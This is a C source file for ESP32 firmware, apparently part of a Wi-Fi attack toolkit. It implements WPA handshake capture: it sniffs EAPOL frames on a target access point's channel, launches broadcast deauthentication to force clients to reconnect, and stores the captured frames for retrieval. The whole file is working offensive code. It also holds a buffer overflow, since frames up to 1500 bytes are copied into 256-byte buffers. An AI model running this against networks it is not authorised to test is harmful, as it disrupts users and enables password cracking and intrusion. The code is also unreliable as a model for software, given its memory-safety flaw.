/**
 * @file attack_handshake.c
 * @author risinek (risinek@gmail.com), SameerAlSahab (sameeralsahab54@gmail.com)
 * @date 2026
 * @brief Implements handshake attacks with frame validation.
 */

#include "attack_handshake.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_wifi_types.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "attack.h"
#include "attack_handshake.h"
#include "attack_method.h"
#include "wifi_controller.h"
#include "esp_wifi.h"
#include "attack_deauth.h"
static const char *TAG = "attack_handshake";
static attack_handshake_methods_t method = -1;
static const wifi_ap_record_t *ap_record = NULL;
static uint8_t captured_eapol_frames = 0;

static TaskHandle_t monitor_task_handle = NULL;
static bool is_running = false;

#define MIN_EAPOL_REQUIRED 4

// Simplified EAPOL frame structure
typedef struct {
    uint8_t payload[256];
    uint32_t len;
} captured_frame_t;

static captured_frame_t captured_frames[MIN_EAPOL_REQUIRED];
static uint8_t frame_index = 0;

// Stub for OLED display (remove if you have the actual display)
#define oled_log(a, b, c, ...) ESP_LOGI(TAG, c, ##__VA_ARGS__)

/**
 * @brief Callback for EAPOL frame capture
 */
static void eapolkey_frame_handler(void *args, esp_event_base_t event_base,
                                   int32_t event_id, void *event_data)
{
    if (!is_running) return;

    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;

    if (frame->rx_ctrl.sig_len <= 0 || frame->rx_ctrl.sig_len > 1500) {
        ESP_LOGW(TAG, "Malformed EAPOL frame dropped");
        return;
    }

    captured_eapol_frames++;
    
    // Store captured frame
    if (frame_index < MIN_EAPOL_REQUIRED) {
        memcpy(captured_frames[frame_index].payload, frame->payload, frame->rx_ctrl.sig_len);
        captured_frames[frame_index].len = frame->rx_ctrl.sig_len;
        frame_index++;
    }

    // Append to status content
   // attack_append_status_content(frame->payload, frame->rx_ctrl.sig_len);

    ESP_LOGI(TAG, "EAPOL %d/%d captured", captured_eapol_frames, MIN_EAPOL_REQUIRED);
    oled_log(0, 0, "EAPOL: %d/%d", captured_eapol_frames, MIN_EAPOL_REQUIRED);
}

void attack_handshake_monitor_task(void *arg)
{
    while (is_running) {
        if (ap_record == NULL) {
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }

        if (captured_eapol_frames >= MIN_EAPOL_REQUIRED) {
            ESP_LOGI(TAG, "Handshake SUCCESS! (%d frames captured)", captured_eapol_frames);
         //   attack_update_status(ATTACK_STATUS_FINISHED);
            attack_handshake_stop();
            monitor_task_handle = NULL;
            vTaskDelete(NULL);
        }

        vTaskDelay(pdMS_TO_TICKS(1000));
    }

    monitor_task_handle = NULL;
    vTaskDelete(NULL);
}

void attack_handshake_start(attack_config_t *attack_config){
    if (attack_config == NULL || attack_config->target_count <= 0) {
        ESP_LOGE(TAG, "Invalid attack config");
        return;
    }
    
    ESP_LOGI(TAG, "Starting handshake attack...");
    captured_eapol_frames = 0;
    frame_index = 0;
    method = attack_config->method;
ap_record = attack_config->ap_records[0];
    is_running = true;

    oled_log(0, 0, "Handshake Active");
    oled_log(0, 0, "Sniffing EAPOL...");

    // Start sniffer on target channel
   esp_wifi_set_channel(ap_record->primary,
                     WIFI_SECOND_CHAN_NONE);

wifictl_sniffer_filter_frame_types(true, false, false);
wifictl_sniffer_start(ap_record->primary);
    switch(attack_config->method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            ESP_LOGI(TAG, "Using BROADCAST method");
  attack_method_broadcast(ap_record, 5);
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            ESP_LOGI(TAG, "Using ROGUE AP method");
           // attack_method_rogueap(ap_record);
           ESP_LOGW(TAG, "Rogue AP mode not implemented");
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            ESP_LOGI(TAG, "Using PASSIVE method (sniffing only)");
            break;
        default:
            ESP_LOGW(TAG, "Unknown method! Fallback to PASSIVE");
    }

    if (monitor_task_handle == NULL) {
        xTaskCreate(attack_handshake_monitor_task, "handshake_mon", 4096, NULL, 5, &monitor_task_handle);
    }
    
    ESP_LOGI(TAG, "Handshake capture started on channel %d", ap_record->primary);
}

void attack_handshake_stop(){
    if (!is_running) return;

    ESP_LOGI(TAG, "Stopping handshake attack...");
    is_running = false;

    switch(method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            stop_deauth_attack();
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
        //    wifictl_mgmt_ap_start();
         //   wifictl_restore_ap_mac();
         ESP_LOGW(TAG, "Rogue AP cleanup not implemented");
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            // Nothing to stop
            break;
        default:
            ESP_LOGW(TAG, "Unknown attack method");
    }

    //wifictl_sniffer_stop();
wifictl_sniffer_stop();
    ap_record = NULL;
    method = -1;

    if (captured_eapol_frames >= MIN_EAPOL_REQUIRED) {
        ESP_LOGI(TAG, "✅ Handshake success! %d frames captured.", captured_eapol_frames);
        oled_log(0, 0, "HANDSHAKE SUCCESS!");
        
        // Print captured frame info
        for (int i = 0; i < frame_index; i++) {
            ESP_LOGI(TAG, "Frame %d size: %d bytes", i + 1, captured_frames[i].len);
        }
    } else {
        ESP_LOGW(TAG, "❌ Handshake incomplete! Only %d frame(s) captured.", captured_eapol_frames);
        oled_log(0, 0, "HANDSHAKE ABORTED");
    }

    ESP_LOGD(TAG, "Handshake attack stopped");
}

// Get captured handshake data
int get_captured_eapol_count(void) {
    return captured_eapol_frames;
}

void get_captured_eapol_frame(int index, uint8_t *buffer, uint32_t *len) {
    if (index < frame_index && buffer && len) {
        memcpy(buffer, captured_frames[index].payload, captured_frames[index].len);
        *len = captured_frames[index].len;
    }
}